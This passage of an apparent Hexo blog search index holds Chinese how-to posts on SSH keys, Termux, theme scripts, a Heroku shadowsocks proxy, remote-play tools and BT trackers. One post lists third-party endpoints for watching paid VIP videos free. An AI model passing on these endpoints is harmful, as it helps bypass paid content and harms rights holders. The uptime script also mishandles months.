script var r=parseInt(Math.floor(Math.random()*10)); arr=new Array(); arr[0]=&quot;生活不止眼前的枸杞,还有诗和远方&quot;; arr[1]=&quot;世界上没有无缘无故的爱，也没有无缘无故的恨，却TM偏偏有无缘无故的胖！&quot;; arr[2]=&quot;生活不止眼前的枸杞,还有诗和远方&quot;; arr[3]=&quot;生活不止眼前的苟且，还有一辈子的苟且。&quot;; arr[4]=&quot;悄悄地我吃了，正如我悄悄地胖。&quot;; arr[5]=&quot;没有天生的高手，更没有永远的菜鸟&quot;; arr[6]=&quot;我最大的缺点，就是缺点钱。&quot;; arr[7]=&quot;可以不劳而获的，只有年纪和脂肪。&quot;; arr[8]=&quot;选择比努力更重要，所以我选择不努力。&quot;; arr[9]=&quot;谈钱伤感情，谈感情伤钱。&quot;; document.write(arr[r]); 内容自行修改 代码说明BlueLake主题多使用jade格式代码，所以可以引用js，或者使用jsde格式的代码 var声明变量 js产生随机数Mcth.floor() 返回数字的最大整数Mach.random() 0到1的随机数，不包含1组合在一起用 arr[]数组 document.write()插入句子 jade学习Jade中文文档 Jade的特点是语法简洁、简单易学、支持嵌入代码、支持多重继承。","tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.unkaer.cf/tags/hexo/"},{"name":"bluelake","slug":"bluelake","permalink":"https://www.unkaer.cf/tags/bluelake/"}]},{"title":"安装deepin系统因NVIDIA显卡造成开机卡在logo界面以及进入桌面鼠标一直转圈等问题","date":"2020-01-19T10:17:52.000Z","path":"deepin-NVIDIA.html","text":"deepin因NVIDIA显卡造成开机启动问题:卡在开机logo界面+进入桌面鼠标一直转圈 临时解决方案： 开机后按esc，然后选中deepin系统，点击enter进入，默认选中第一个，如下图所示，然后这个时候千万不要点击enter，这个时候应该按键盘上的 e，进入grub编辑页面； 然后我们在菜单中的代码中，找到倒数第二行，会出现如下所示的代码：linux /vmlinuz-4.15.0-29deepin-generic root=UUID=xxxxxxxxx ro splash quiet上面这行表示加载linux内核文件，后面是内核的参数，以下为解释： root告诉内核根分区的设备；ro表示在设备启动时为read-only，如果是rw表示read-writesplash表示开机动画splash表示开机动画quiet表示在启动过程中只有重要信息显示，类似硬件自检的消息不会显示quiet表示在启动过程中只有重要信息显示，类似硬件自检的消息不会显示single以单用户模式登录，一般用于修改系统，比如deepin密码忘记了等等。single以单用户模式登录，一般用于修改系统，比如deepin密码忘记了等等。3. 在quiet的后面空一格加上如下所示的代码：方案1-推荐 acpi_osi=! acpi=&quot;windows 2009&quot;方案2-不加载核显驱动 nouveau.modeset=0方案3-没有独显驱动 nvidia.modeset=0（3）在quiet的后面空一格加上如下所示的代码： ，然后按F10保存即可。这时会重新开始登录deepin系统，耐心等待进入桌面即可。 永久性解决方案 按 Ctrl+Alt+T 进入打开终端，输入以下代码来打开grub配置文件：方法1-geditsudo gedit /boot/grub/grub.cfg方法2-nanosudo nano /boot/grub/grub.cfg方法3-visudo vi /boot/grub/grub.cfg注意：这时会提示你输入密码，也就是超级用户的密码 输入密码成功后会打开你的grub.cfg文件，然后按 Ctrl+F 搜索 quiet，找到第一个quiet后面空一格加上，临时方案中相应的代码，并保存退出。 开机重启，问题已经永久解决！","tags":[{"name":"显卡","slug":"显卡","permalink":"https://www.unkaer.cf/tags/%E6%98%BE%E5%8D%A1/"},{"name":"deepin","slug":"deepin","permalink":"https://www.unkaer.cf/tags/deepin/"}]},{"title":"使用ssh部署到github","date":"2020-01-16T14:44:51.000Z","path":"ssh-github.html","text":"使用ssh连接到github，避免每次上传代码要输入账号密码。 Github官方文档参考文档：使用 SSH 连接到 GitHub使用 SSH 连接到 GitHub您可以使用 SSH 连接到 GitHub。 关于 SSH使用 SSH 协议可以连接远程服务器和服务并向它们验证。 利用 SSH 密钥可以连接 GitHub，而无需在每次访问时提供用户名或密码。 检查现有 SSH 密钥在生成 SSH 密钥之前，您可以检查是否有任何现有的 SSH 密钥。 生成新 SSH 密钥并添加到 ssh-agent检查现有 SSH 密钥后，您可以生成新 SSH 密钥以用于身份验证，然后将其添加到 ssh-agent。 生成新 SSH 密钥 打开 Terminal（终端）。 粘贴下面的文本（替换为您的 GitHub 电子邮件地址）。 $ ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot;这将创建以所提供的电子邮件地址为标签的新 SSH 密钥。 &gt; Generating public/private rsa key pair. 提示您“Enter a file in which to save the key（输入要保存密钥的文件）”时，按 Enter 键。 这将接受默认文件位置。 &gt; Enter a file in which to save the key (/Users/you/.ssh/id_rsa): [Press enter] 在提示时输入安全密码。 更多信息请参阅“使用 SSH 密钥密码”。 &gt; Enter passphrase (empty for no passphrase): [Type a passphrase] &gt; Enter same passphrase again: [Type passphrase again] 将 SSH 密钥添加到 ssh-agent将新 SSH 密钥添加到 ssh-agent 以管理密钥之前，应检查现有 SSH 密钥并生成新 SSH 密钥。 将 SSH 密钥添加到该代理时，应使用默认的 macOS ssh-add 命令，而不是使用通过 macports, homebrew 或某些其他外部来源安装的应用程序。 在后台启动 ssh 代理。$ eval &quot;$(ssh-agent -s)&quot; &gt; Agent pid 59566 如果您使用的是 macOS Sierra 10.12.2 或更高版本，则需要修改 ~/.ssh/config 文件以自动将密钥加载到 ssh-agent 中并在密钥链中存储密码。Host * AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/id_rsa 将 SSH 私钥添加到 ssh-agent 并将密码存储在密钥链中。 如果您创建了不同名称的密钥，或者您要添加不同名称的现有密钥，请将命令中的 id_rsa 替换为您的私钥文件的名称。$ ssh-add -K ~/.ssh/id_rsa 注：-K 选项位于 Apple 的 ssh-add 标准版本中，当您将 ssh 密钥添加到 ssh-agent 时，它会将密码存储在您的密钥链中。 新增 SSH 密钥到 GitHub 帐户要配置 GitHub 帐户使用新的（或现有）SSH 密钥，您还需要将其添加到 GitHub 帐户。 将 SSH 密钥复制到剪贴板。 如果您的 SSH 密钥文件与示例代码不同，请修改文件名以匹配您当前的设置。 在复制密钥时，请勿添加任何新行或空格。 $ pbcopy &lt; ~/.ssh/id_rsa.pub # Copies the contents of the id_rsa.pub file to your clipboard 提示：如果 pbcopy 不可用，可找到隐藏的 .ssh 文件夹，在常用的文本编辑器中打开该文件，并将其复制到剪贴板。 在任何页面的右上角，单击您的个人资料照片，然后单击 Settings（设置）。 3.在用户设置侧边栏中，单击 SSH and GPG keys（SSH 和 GPG 密钥）。 4. 单击 New SSH key（新 SSH 密钥）或 Add SSH key（添加 SSH 密钥）。 5. 在 “Title”（标题）字段中，为新密钥添加描述性标签。 例如，如果您使用的是个人 Mac，此密钥名称可能是 “Personal MacBook Air”。 将密钥粘贴到 “Key”（密钥）字段。 7. 单击 Add SSH key（添加 SSH 密钥）。 8. 如有提示，请确认您的 GitHub 密码。 测试 SSH 连接→设置 SSH 密钥并将其添加到您的 GitHub 帐户后，您可以测试连接。 打开 Terminal（终端）。 输入以下内容： $ ssh -T git@github.com您可能会看到类似如下的警告： &gt; The authenticity of host &#39;github.com (IP ADDRESS)&#39; can&#39;t be established. &gt; RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48. &gt; Are you sure you want to continue connecting (yes/no)?或类似如下： &gt; The authenticity of host &#39;github.com (IP ADDRESS)&#39; can&#39;t be established. &gt; RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8. &gt; Are you sure you want to continue connecting (yes/no)? 验证您看到的消息中的指纹匹配步骤 2 中的消息之一，然后输入 yes： &gt; Hi username! You&#39;ve successfully authenticated, but GitHub does not &gt; provide shell access. 验证生成的消息包含您的用户名。 如果收到“权限被拒绝”消息， 使用 SSH 密钥密码→您可以保护 SSH 密钥并配置身份验证代理，这样您就不必在每次使用 SSH 密钥时重新输入密码。 添加或更改密码通过输入以下命令，您可以更改现有私钥的密码而无需重新生成密钥对： $ ssh-keygen -p # Start the SSH key creation process &gt; Enter file in which the key is (/Users/you/.ssh/id_rsa): [Hit enter] &gt; Key has comment &#39;/Users/you/.ssh/id_rsa&#39; &gt; Enter new passphrase (empty for no passphrase): [Type new passphrase] &gt; Enter same passphrase again: [One more time for luck] &gt; Your identification has been saved with the new passphrase. 如果您的密钥已有密码，系统将提示您输入该密码，然后才能更改为新密码。 在密钥链中保存密码在 OS X Leopard 上通过 OS X El Capitan，这些默认私钥文件将自动处理： .ssh/id_rsa .ssh/identity初次使用密钥时，系统将提示您输入密码。 如果选择使用密钥链保存密码，则无需再次输入密码。 否则，您可在将密钥添加到 ssh-agent 时在密钥链中存储密码。 简易版新建sshssh-keygen -t rsa -C &quot;邮箱@xx.com&quot;此处可以不是邮箱，只是用于识别区别使用。提示输入保存密钥路径，直接回车即可（三次默认回车）。第一次提醒设置密钥储存位置及名称第二次提示密码（为了避免麻烦，每次使用要输入密码。就设置为空，直接回车）第三次提示 重复密码 设置github密钥/.ssh，文件夹内会存在2个文件：id_rsa和id_rsa.pub打开id_rsa.pub，将里面的内容复制到github的ssh设置中将公钥内容添加到GitHub 1、打开GitHub网站进行登陆； 2、到个人设置页Personal Settings； 3、找到SSH and GPG keys； 4、选择新建SSH key：new ssh key； 5、填写和粘贴公钥内容（不含中文）。修改全局git的用户名和邮箱git config --global user.name &quot;用户名&quot; git config --global user.email 邮箱@xx.com测试ssh -T git@github.com 对 GitHub 尝试 ssh","tags":[{"name":"ssh","slug":"ssh","permalink":"https://www.unkaer.cf/tags/ssh/"},{"name":"github","slug":"github","permalink":"https://www.unkaer.cf/tags/github/"}]},{"title":"使用Termux在手机上建站","date":"2020-01-16T13:31:24.000Z","path":"Termux-hexo.html","text":"手机上Termux安装hexo环境，搭建网页，并上传到github。 Termux官网 hexo官网 nodejspkg install nodejs gitpkg install git hexonpm install hexo-cli -g 新建网页并测试hexo # 安装 hexo g # 编译 hexo s # 本地服务器 hexo clean #清理 hexo d # 上传 ssh pkg install openssh ssh-keygen -t rsa -C &quot;邮箱@xx.com&quot; 修改全局git的用户名和邮箱git config --global user.name &quot;用户名&quot; git config --global user.email 邮箱@xx.com 测试 ssh -T git@github.com","tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.unkaer.cf/tags/hexo/"},{"name":"Termux","slug":"Termux","permalink":"https://www.unkaer.cf/tags/Termux/"}]},{"title":"Termux安装使用","date":"2020-01-16T13:30:42.000Z","path":"Termux.html","text":"Termux是Android上的终端模拟器 TermuxTermux是一个Android下一个高级的终端模拟器,开源且不需要root,支持apt管理软件包，十分方便安装软件包,完美支持Python,PHP,Ruby,Go,Nodejs,MySQL等。随着智能设备的普及和性能的不断提升，如今的手机、平板等的硬件标准已达到了初级桌面计算机的硬件标准,用心去打造完全可以把手机变成一个强大的工具。官网Github项目Google Play下载地址 Termux 0.88版 20200123发布高速下载地址 备用下载地址com.termux_88 参考资料：国光 基本命令Termux除了支持apt命令外,还在此基础上封装了pkg命令,pkg命令向下兼容apt命令.简单的介绍pkg命令: pkg search 搜索包 pkg install 安装包 pkg uninstall 卸载包 pkg reinstall 重新安装包 pkg update 更新源 pkg upgrade 升级软件包 pkg list-all 列出可供安装的所有包 pkg list-installed 列出已经安装的包 pkg shoe 显示某个包的详细信息 pkg files 显示某个包的相关文件夹路径 更换国内源更换Termux清华大学源,加快软件包下载速度. 设置默认编辑器export EDITOR=vi 编辑源文件apt edit-sources 将原来的https://termux.net官方源替换为http://mirrors.tuna.tsinghua.edu.cn/termux # The termux repository mirror from TUNA: deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main保存并退出 上面是官方推荐的方法,其实还有更简单的方法,类似于Linux下直接去编辑源文件: vi $PREFIX/etc/apt/sources.list 备份记录官方源： # The main termux repository: deb https://termux.org/packages/ stable main 安装基本工具pkg update pkg install vim curl wget git unzip unrar 访问SD卡termux-setup-storage ~ 家目录会有一个storage目录，就可以访问SD卡了 使用软连接类似这样，直接访问QQ文件夹 ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ","tags":[{"name":"Termux","slug":"Termux","permalink":"https://www.unkaer.cf/tags/Termux/"}]},{"title":"BlueLake主题页脚添加建站时间","date":"2020-01-15T03:45:57.000Z","path":"BlueLake-time.html","text":"为BlueLake主题页脚添加建站时间 页脚文件themes/BlueLake/layout/_partial/footer.jade 添加内容页脚引用js文件在合适的位置加上 span a(id=&quot;sitetime&quot;) script(language=javascript src=url_for(theme.js) + &#39;/settime.js&#39;) js内容js存放位置 themes/BlueLake/source/js/settime.js修改里面的建站时间，已经把年的显示注释掉了，需要可自行修改。 function siteTime(){ window.setTimeout(&quot;siteTime()&quot;, 1000); var seconds = 1000; var minutes = seconds * 60; var hours = minutes * 60; var days = hours * 24; var years = days * 365; var today = new Date(); var todayYear = today.getFullYear(); var todayMonth = today.getMonth()+1; var todayDate = today.getDate(); var todayHour = today.getHours(); var todayMinute = today.getMinutes(); var todaySecond = today.getSeconds(); /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳) year - 作为date对象的年份，为4位年份值 month - 0-11之间的整数，做为date对象的月份 day - 1-31之间的整数，做为date对象的天数 hours - 0(午夜24点)-23之间的整数，做为date对象的小时数 minutes - 0-59之间的整数，做为date对象的分钟数 seconds - 0-59之间的整数，做为date对象的秒数 microseconds - 0-999之间的整数，做为date对象的毫秒数 */ var t1 = Date.UTC(2019,12,30,18,00,00); //建站时间 var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond); var diff = t2-t1; var diffYears = Math.floor(diff/years); var diffDays = Math.floor((diff/days)-diffYears*365); var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours); var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes); var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds); document.getElementById(&quot;sitetime&quot;).innerHTML=&quot; 本站已运行&quot;+/*diffYears+&quot; 年 &quot;+*/diffDays+&quot; 天 &quot;+diffHours+&quot; 小时 &quot;+diffMinutes+&quot; 分钟 &quot;+diffSeconds+&quot; 秒&quot;; } siteTime(); 注意使用jade格式！！！缩进使用空格","tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.unkaer.cf/tags/hexo/"},{"name":"bluelake","slug":"bluelake","permalink":"https://www.unkaer.cf/tags/bluelake/"}]},{"title":"BlueLake主题界面半透明设置","date":"2020-01-15T03:45:19.000Z","path":"BlueLake-btm.html","text":"将BlueLake主题的界面变为半透明，主题美化。 修改主题风格文件目录themes\\BlueLake\\source\\css\\style.styl白色半透明rgba(255,250,250,0.85) 115行左右修改背景图background:url(https://xxx.webp) background-size: cover background-attachment: fixed 206行左右修改sidebar侧边栏背景颜色改为 background: rgba(255,250,250,0.85) 270行左右修改*search-form 搜索栏背景颜色改为 background: rgba(255,250,250,0.85) 282行左右修改*result-wrap 搜索栏结果背景颜色改为 background: rgba(255,250,250,0.85) 358行左右修改/* post */ 文章页面背景颜色改为 background: rgba(255,250,250,0.85)","tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.unkaer.cf/tags/hexo/"},{"name":"bluelake","slug":"bluelake","permalink":"https://www.unkaer.cf/tags/bluelake/"}]},{"title":"Heroku+Proxifier实现全局科学上网","date":"2020-01-12T08:49:12.000Z","path":"heroku-Proxifier.html","text":"heroku上部署的代理，实现全局代理。 在heroku上部署shadowsocks-heroku见文章heroku+SwitchyOmega实现谷歌浏览器科学上网 Proxifier代理软件汉化版来自备用下载地址Proxifier_setup_v3.31.exe 使用方法 添加代理服务器填写之前设置的本地的服务器地址和端口选择 socks版本5 设置代理规则 应用程序ss-h.exe设置为直连Direct 本地Localhost设置为直连Direct 默认Default其他任意设置为代理连接Proxy Socks5 127.0.3.14 开始使用百度IPip地址为美国打开Google搜索证明代理成功 其它代理规则还可以自定义，只代理常用网址或软件，就不会导致访问部分国内网站慢了。代理前要开启本地的代理服务器","tags":[{"name":"heroku","slug":"heroku","permalink":"https://www.unkaer.cf/tags/heroku/"}]},{"title":"heroku+SwitchyOmega实现谷歌浏览器科学上网","date":"2020-01-12T08:48:46.000Z","path":"heroku-SwitchyOmega.html","text":"heroku搭建代理+SwitchyOmega谷歌浏览器插件实现科学上网,自由登录谷歌，使用谷歌服务，浏览网页。但网速只有128kb/s，满足日常查资料使用。 shadowsocks-herokushadowsocks-heroku 是可部署在 Heroku 平台的 ss 服务。但 ss-h不同于普通的ss，不能直接ss客户端使用 。和 shadowsocks 不同的是 shadowsocks-heroku 使用的 WebSocket 代替原本的 sockets。 如果遇到问题 请先检查是否遵循步骤（再次阅读一遍教程） 请先自行通过Google/Github寻找答案 如果还没有解决，欢迎通过 issue 提问（贴日志和配置的时候注意隐藏密码&amp;个人ip） 准备1. 注册 Heroku 帐号Heroku 是一个支持多种编程语言的云平台即服务，Heroku 提供免费账号，部分介绍如下： 512 MB RAM per dyno Free apps sleep automatically after 30 mins of inactivity to conserve your dyno hours Free apps wake automatically when a web request is received https://devcenter.heroku.com/articles/limits https://devcenter.heroku.com/articles/free-dyno-hours#usage 注册地址：https://signup.heroku.com/ （注册和部署过程可能需要梯子） 部署 点击 ，一键部署到heroku 也可以选择另一个版本的服务端shadowsocks-websocket-python手机用户建议部署跨平台支持更好的v2ray 设置 加密算法和app 密码 支持的加密算法类型如下 Supported Ciphers rc4 rc4-md5 table bf-cfb des-cfb idea-cfb seed-cfb cast5-cfb aes-128-cfb aes-192-cfb aes-256-cfb camellia-256-cfb camellia-192-cfb camellia-128-cfb 启动本地 Client1.官方下载地址蓝凑云下载地址 下载相应的版本，并放在适当的位置。2. 修改config.json参数 &quot;server&quot;: &quot;unkaer.herokuapp.com&quot;, //服务器地址,自己取得名字+.herokuapp.com &quot;local_address&quot;: &quot;127.0.3.14&quot;, //本地代理地址，可自行修改 &quot;scheme&quot;: &quot;ws&quot;, &quot;local_port&quot;: &quot;233&quot;, //本地连接端口,可自行修改 &quot;remote_port&quot;: &quot;80&quot;, //服务器端口 &quot;password&quot;: &quot;password&quot;, //密码 &quot;timeout&quot;: 600, //超时 &quot;method&quot;: &quot;camellia-256-cfb&quot; //加密方式 开启本地代理服务器 运行 ss-h.exe会有命令行提示(推荐第一次时使用) 或 start.vbs后台静默 （推荐日常使用，或开机自启，方法见开机自动拨号上网） 可更改运行图标，win托盘运行，更美观方便。见win托盘工具taskbar.exe 启动成功，命令行显示： server listening at { address: &#39;127.0.0.1&#39;, family: &#39;IPv4&#39;, port: 1080 } 配置代理 下载：Chrome 浏览器 SwitchyOmega 插件 安装：打开浏览器的扩展程序页面 chrome://extensions，把 SwitchyOmega.crx 文件拖放到浏览器扩展程序页面安装 配置：添加SwitchyOmega代理服务器 代理协议： SOCKS5 代理服务器local_address：127.0.3.14 代理端口local_port： 1080 添加网络自动切换切换规则排序 条件类型 条件设置 情景模式 操作 raw.githubusercontent.com 规则列表规则 https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt 开始使用浏览器右上角，SwitchyOmega代理选择网络自动切换。 其他使用方案见heroku+Proxifier实现全局科学上网","tags":[{"name":"heroku","slug":"heroku","permalink":"https://www.unkaer.cf/tags/heroku/"}]},{"title":"手心输入法","date":"2020-01-12T08:43:42.000Z","path":"shouxin.html","text":"一款智能、高效,无广告骚扰,只专注于输入本质的纯粹输入法 手心输入法官网 无广告骚扰 极致简约 知你所想 极速体验 彰显个性","tags":[{"name":"输入法","slug":"输入法","permalink":"https://www.unkaer.cf/tags/%E8%BE%93%E5%85%A5%E6%B3%95/"}]},{"title":"局域网用手机玩电脑","date":"2020-01-11T12:03:32.000Z","path":"jywwdn.html","text":"两款在局域网用手机控制电脑的软件推荐。“Remotr”，“Moonlight” Remotr官网 电脑端设置安装电脑端 Remotr注册并登录 手机端设置下载链接Remotr_1.0.348.apk下载并安装登录连接到同一局域网 优缺点可以自定义按键，操作方便。 订阅订阅付费版，可以远程控制，不必局域网。（推荐steam link） Moonlight官网 电脑端设置手机端设置下载链接Moonlight_8.8.1.apk 优缺点基于N卡到游戏串流 注意电脑必须是N卡，且支持游戏串流NVIDIA SHIELD GeForce GTX台式机GPU, 600系列或更高级别，或笔记本型GTX 660M.670MX,675MX 680M,700M系列或更高级别 4GB系统内存或更大容量 802.11a/g路由器(最低要求)。802.11n 双频路由器(推荐) Windows 7, Windows 8或Windows 10 GeForce 388.19驱动程序或更新版本","tags":[{"name":"局域网","slug":"局域网","permalink":"https://www.unkaer.cf/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"远程控制","slug":"远程控制","permalink":"https://www.unkaer.cf/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/"}]},{"title":"steam远程畅玩","date":"2020-01-11T12:03:02.000Z","path":"steam-link.html","text":"steam远程畅玩，随时随地玩电脑游戏。 安装steam link下载地址 配对电脑手机端手机安装好后，“设置”，“电脑”，“其他电脑”会出现PIN码 电脑端1.前往Steam, 点击”Steam”&gt;“设置”&gt;“远程畅玩’2.点击“配对Steam流式设备”3.输入PIN码以继续 网络测试“设置”，“电脑”，“网络测试”测试通过就可以快乐畅玩了 开始畅玩开始运行","tags":[{"name":"局域网","slug":"局域网","permalink":"https://www.unkaer.cf/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"远程控制","slug":"远程控制","permalink":"https://www.unkaer.cf/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/"}]},{"title":"TeamViewer远程控制","date":"2020-01-10T11:53:46.000Z","path":"TeamViewer.html","text":"TeamViewer远程控制,可以协助朋友操作电脑，远程解决电脑问题。 官网TeamViewer远程控制下载免费版本 安装一路下一步就行了，可根据自己需要更改。 远程控制只有告诉伙伴，ID和密码，就能链接并控制这台电脑啦。 其他说明可以注册TeamViewer账号，将自己的设备统一管理，个人使用完全免费，就可以轻轻松松远程控制自己的电脑啦。","tags":[{"name":"局域网","slug":"局域网","permalink":"https://www.unkaer.cf/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"name":"远程控制","slug":"远程控制","permalink":"https://www.unkaer.cf/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/"}]},{"title":"VIP视频解析观看","date":"2020-01-09T11:51:51.000Z","path":"VIP.html","text":"国内主流视频网站视频解析，支持VIP视频。 操作指南第 一 步进入各大视频网站，找到想要观看的VIP电影，然后复制链接（浏览器上的视频地址） 第 二 步将复制的链接粘贴到本站视频解析接口后面，访问该链接 第 三 步等待解析完成，即可免费观看VIP电影视频 部分视频解析接口如果接口不能用，尝试更换其他接口。http://v.d9y.net/vip/?url=http://jx.du2.cc/?url=http://jx.drgxj.com/?url=http://jx.618ge.com/?url=http://vip.jlsprh.com/?url=http://jx.598110.com/?url= 主流视频网站乐视视频奇艺视频芒果视频土豆视频腾讯视频优酷视频搜狐视频pptv视频 说明：资源全部来自互联网，本站不负任何责任。视频服务仅支持学习交流，勿用非法用途！本站不承担任何责任！","tags":[{"name":"VIP","slug":"VIP","permalink":"https://www.unkaer.cf/tags/VIP/"},{"name":"视频","slug":"视频","permalink":"https://www.unkaer.cf/tags/%E8%A7%86%E9%A2%91/"}]},{"title":"BT种子下载","date":"2020-01-08T09:14:24.000Z","path":"BT-download.html","text":"bt彗星官网 种子服务器GitHub项目：公共BitTorrent跟踪器列表将服务器列表加入Bt彗星中推荐添加全部服务器 官方链接trackers_all.txt https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all.txt CDN加速链接trackers_all.txt https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_all.txt","tags":[{"name":"下载","slug":"下载","permalink":"https://www.unkaer.cf/tags/%E4%B8%8B%E8%BD%BD/"}]},{"title":"通过小娜启动快捷方式","date":"2020-01-06T10:40:23.000Z","path":"cortana.html","text":"语音控制小娜打开网站 开启小娜 Cortanawin+i 打开设置 小娜启用语音唤醒 创建快捷方式在桌面创建网页的快捷方式例如右键桌面，新建快捷方式，内容 https://unkaer.github.io命名为 我的博客 添加到程序将新建的快捷方式移动，程序启动菜单。 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs会有管理员权限，同意 语音测试对电脑说 你好小娜，打开我的博客就打开了网站 按照此法，可以通过小娜，启动许多应用。","tags":[{"name":"脚本","slug":"脚本","permalink":"https://www.unkaer.cf/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"开机自动拨号上网","date":"2020-01-06T01:12:24.000Z","path":"bhsw.html","text":"开机自动拨号上网，避免每次开机需要重新手动拨号的麻烦。 新建拨号上网账号密码取个名称 编写拨号脚本（方便日后更改）在桌面新建文本文档用记事本打开编辑内容代码 格式为rasdial 名称 账号 密码例如名称为 宽带连接账号 123456密码 233 那么就写 rasdial 宽带连接 123456 233保存关闭，重命名为，拨号上网.bat (重命名时要包括后面的.txt)提示后缀名更改，确定。如果后缀名没有，在资源管理器里打开。 打开资源管理器，查看，勾选，显示后缀名 双击测试一下会有一个小黑窗，然后就拨号成功。 添加到任务计划程序鼠标右键此电脑——管理。找到任务计划程序。 创建基本任务名称 拨号上网触发器 当前用户登录时操作 启动程序 选择桌面上的 拨号上网.bat完成 拨号脚本在桌面开机后只需要双击脚本，就可以自动拨号上网。","tags":[{"name":"脚本","slug":"脚本","permalink":"https://www.unkaer.cf/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"Notepad++编写md文档","date":"2020-01-05T13:05:01.000Z","path":"Notepad.html","text":"用Notepad++在Windows下搭建编写md文档的环境 设置语言设置-&gt;语言为简体中文： 字体、主题设置： 设置-&gt;语言格式设置 选择主题-&gt;Obsidian 字体样式-&gt;字体名称：-&gt;YaHei Consolas Hybrid字体下载：Consolas和微软雅黑混合字体字体安装方法：将文件放入字体文件夹C:\\Windows\\Fonts 安装插件MarkdownViewer++ 在菜单栏选择插件-&gt;插件管理找到MarkdownViewer++ 安装，重启应用 导入自定义语言格式为了设置符合markdown语言的显示效果，需要下载Markdown语言格式的xml配置文件下载userDefinedLang-markdown.blackboard.modern.xml 语言-&gt;User Defined Language-&gt;自定义语言格式…导入 附因为Markdown语言格式与Notepad自身的配置不同导致显示不正常， 设置-&gt;语言格式设置…勾选使用全局背景色","tags":[{"name":"markdown","slug":"markdown","permalink":"https://www.unkaer.cf/tags/markdown/"}]},{"title":"跨平台扩展电脑屏幕spacedesk","date":"2020-01-05T09:45:59.000Z","path":"spacedesk.html","text":"视窗网络显示监视器软件，将闲置设备作为屏幕扩展。 将闲置设备作为屏幕扩展使用初衷：有一台闲置的lumia 830（Windows phone），想把它作为电脑屏幕扩展。通过支持HTML5的浏览器扩展电脑屏幕。 spacedesk官网视窗网络显示监视器软件复制您的桌面 功能和系统要求网络显示多显示器软件 Windows 桌面扩展（x10-sion） Windows 桌面复制（镜像/克隆） 触 屏 Windows 查看器支持的 KVM（键盘和鼠标远程处理） 辅助机器和主机 至少需要两台机器：辅助机器和主机 所有机器必须连接到 LAN（局域网）。 需要支持网络协议 TCP/IP。连接可通过 USB（例如共享）、LAN 电缆或无线方式进行。 主机（视窗电脑、笔记本电脑和平板电脑）：空间桌面驱动程序主计算机运行 Windows 服务和 WDDM 驱动程序。这显示为 Windows 10 的附加图形适配器，以及 Windows 7 和 8.1 上现有图形适配器的附加监视器连接。此附加的虚拟图形适配器或显示连接器可以镜像任何其他 Windows 显示屏幕或扩展 Windows 桌面。主计算机上的空间桌面软件正在捕获屏幕内容，压缩屏幕内容，并通过 LAN（局域网）将其传输到空间桌面辅助计算机。 视窗 10（WDDM IddCx 间接显示驱动程序） 视窗 8.1 / 7 （WDDM 过滤器钩显示驱动程序） 辅助机器（PC、笔记本电脑、平板电脑、智能手机和设备） 视窗 7 / 8.1 / 10 安卓系统（&gt; 版本 4.1） iOS （&gt; 版本 9.3） 任何其他： HTML5 网络浏览器 （ Chrome （&gt; 16）， Safari （&gt; 5.1） 互联网浏览器 （&gt; 10）， 歌剧 （&gt; 27） ） 网络（局域网） TCP/IP v4X TCP/IP v6（仅限未来版本）X 没有加密在客户端和服务器之间传输数据。因此，传输的所有信息都有可能提供给网络中的每个人。 下载 说明书 用于 Windows主电脑（服务器）的驱动程序软件视窗 10 （64 位）msi 版本： 0.9.25视窗 10 （32 位）msi 版本： 0.9.25Windows 10 - 周年更新版本 1607 （内部版本 14393） 及上版本 视窗 7/8.1（64 位）msi 版本：0.9.20视窗 7/8.1（32 位）msi 版本：0.9.20视窗 7 / 视窗 8.1 辅助机器的空格自大查看器软件（客户端）局域网 （LAN） 和无线 窗户Google play Android亚马逊IosGo to Html5HTML5 应用先决条件 请删除 Web 浏览器设置上的缓存文件、图像和 Cookie 以加载最新的 HTML5 查看器页面。 需要最新版本的 Web 浏览器和操作系统。请更新。 由于性能限制，Mozilla Firefox 目前不受支持。","tags":[{"name":"屏幕","slug":"屏幕","permalink":"https://www.unkaer.cf/tags/%E5%B1%8F%E5%B9%95/"}]},{"title":"电脑TrafficMonitor流量监控软件","date":"2020-01-05T06:09:25.000Z","path":"TrafficMonitor.html","text":"这是一个用于显示当前网速、CPU及内存利用率的桌面悬浮窗软件，并支持任务栏显示，支持更换皮肤。 TrafficMonitorGitHub上的项目官网Monitor是一款用于Windows平台的网速监控悬浮窗软件，可以显示当前网速、CPU及内存利用率，支持嵌入到任务栏显示，支持更换皮肤、历史流量统计等功能。 相关链接：请点击此处下载TrafficMonitor的最新版本。备用链接：百度网盘下载如果遇到问题，请点击此处。 主要特性 显示当前实现网络传输速率、CPU和内存占用率 如果电脑有多个网卡，支持自动和手动选择网络连接 查看网络详细信息 支持嵌入到任务栏显示 支持更换皮肤和自定义皮肤 历史流量统计 